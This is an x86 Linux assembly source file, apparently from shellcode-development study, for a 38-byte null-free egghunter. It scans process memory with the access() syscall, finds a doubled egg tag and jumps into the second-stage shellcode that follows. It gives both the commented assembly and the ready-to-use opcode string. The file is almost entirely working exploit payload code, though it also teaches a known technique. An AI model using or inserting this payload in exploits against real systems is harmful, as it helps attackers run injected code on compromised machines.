; This bit of code scans the memory for accessible pages and then hunts
; for a specific byte signature (egg, here: 0x90509050). Once it finds
; that "tag" twice, it's assuming that a shellcode is following and then
; executes this 2nd stage of code.
;
; Note: I chose the "access" method due to better readability and robustness.
; 
; Create elf32 executable with: ./compile.sh egghunter
;
; PoC C-Code to simulate a multi-memory-block-environment is included (poc.c)
;
; some nifty details
; -^- 38 bytes
; -^- zero zero's

; egghunter code bytes:
;
; "\x31\xc9\xf7\xe1\xfc\x66\x81\xca\xff\x0f\x42\x6a\x21\x58\x8d\x5a"
; "\x04\xcd\x80\x3c\xf2\x74\xee\x89\xd7\xb8\x50\x90\x50\x90\xaf\x75"
; "\xe9\xaf\x75\xe6\xff\xe7"
;
; Check out this great paper: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
; It really explains a LOT in more detail...

global _start
 
section .text
 
_start:
		xor ecx, ecx
		mul ecx				; trick to clean ecx, eax, edx
		cld   				; clear direction flag
 
npage:
		or dx, 0xfff			; add PAGE_SIZE to scan pointer, work in 0xffff boundaries (align page)

nbyte:
		inc edx				; increase scan pointer (memory address)

		; what's next? well, we'll check if the memory at the ptr is accessible
		; 
		; int access(const char *pathname, int mode);
		;
		; this function will return 0xfffffff2 if memory is not readable
		; ... so basically our code loops over the whole memory until we find
		; an accessible memory block where we'll then look for our signature bytes
		; ... if these are found (twice), we can the expect the shellcode
		; to follow and we'll just jump into that place, full of confidence :-)
		; ... why twice the sig bytes? in order not to trigger on wrong data (see below)

		push byte 0x21  				; syscall access()
		pop eax                         ; load eax with 0x21 (syscall number)
		lea ebx, [edx+4]				; we'll try to access edx+4 bytes (if that works, edx+0 will work, too!)
										; ecx (mode) = 0
		int 0x80
 
		cmp al, 0xf2    				; check for error (EFAULT)
		jz npage    					; we can't read the page, let's try +0x1000 bytes
 
		; page is accessible! ... now hunt for the egg

		mov edi, edx
		mov eax, 0x90509050				; 0x90509050 is our egg signature
		scasd
		jnz nbyte   					; nope - increase ptr by 1 and try to read and scan again
		scasd           				; scanning again (looking for a 2nd hit right after the 1st one)
										; we do that twice in order to not trigger on the
										; "mov eax, 0x90509050" bytecode but instead only
										; trigger when reaching "the real egg" (tm)
		jnz nbyte   					; no luck, increase ptr and try again
 
		jmp edi         				; found egg twice, edi is now loaded with the address after
										; the 2nd egg (where we'll put the shellcode)
